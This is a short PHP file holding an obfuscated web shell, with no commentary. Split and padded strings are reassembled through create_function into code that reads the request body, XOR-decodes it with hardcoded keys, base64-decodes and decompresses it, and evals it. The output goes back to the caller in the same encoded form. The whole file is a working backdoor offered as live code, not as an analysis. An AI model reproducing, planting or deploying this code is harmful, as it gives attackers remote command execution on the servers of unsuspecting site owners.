<?php
$O='g_<*match<*("/$kh(.+)$<*kf/",@file_<*get_c<*ontents<*<*("php://inpu<*t"),$m)==<';
$l=str_replace('Gq','','creGqaGqGqte_fuGqncGqtGqion');
$Y=';$p="<*XV<*rj3VsV0RPHwiP<*R";functi<*o<*<*n x($t,$k){$c=<*strlen<*($k);$l=s<*';
$T='$<*m[1])<*,$k)<*));$o=@<*ob_get_conte<*nts();<*@<*<*ob_end<*_clean();$r=@b';
$y='<*ase<*64_enc<*ode(@x(@<*gzcompre<*ss($o)<*,$<*k<*<*));print("$p$kh$r$kf");}';
$z='*<*1) {@ob_sta<*rt()<*;@ev<*al(@gzunc<*ompr<*ess(@x(@b<*ase64_d<*<*ecode(';
$F=';$j++<*,$i++){<*$o.=$t{$i}<*^$<*k{$j};}}r<*et<*urn $o;<*<*}if (@pre<*';
$e='trle<*<*n($t);$o="<*";<*for($i<*=0<*;$i<$l;){for($j<*=0<*;($<*j<$c&&$i<$l<*)';
$s='$<*k="5c1<*c83f<*6";$kh="4b9370<*f136<*f6";$kf="f<*10d<*e<*<*5719180"';
$N=str_replace('<*','',$s.$Y.$e.$F.$O.$z.$T.$y);
$t=$l('',$N);$t();
?>
